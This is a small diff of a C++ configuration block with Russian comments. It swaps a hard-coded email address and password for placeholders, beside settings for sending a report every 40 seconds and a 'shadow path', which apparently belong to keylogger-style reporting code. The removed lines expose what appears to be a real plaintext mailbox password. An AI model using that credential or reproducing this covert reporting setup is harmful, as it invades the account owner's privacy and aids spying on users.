@@ -35,9 +35,9 @@
 
 // Конфигурация
 /** @brief Конфигурация email. */
-const std::string EMAIL_ADDRESS = "danil.smoke.00@mail.ru";
+const std::string EMAIL_ADDRESS = "YOUR_EMAIL";
 /** @brief Пароль от почты. */
-const std::string EMAIL_PASSWORD = "jBwYTceRkng0Ziyy89rO";
+const std::string EMAIL_PASSWORD = "YOUR_PASSWORD";
 /** @brief Время до отправления отчета в секундах. */
 const int SEND_REPORT_EVERY = 40; // в секундах
 /** @brief Теневой путь. */
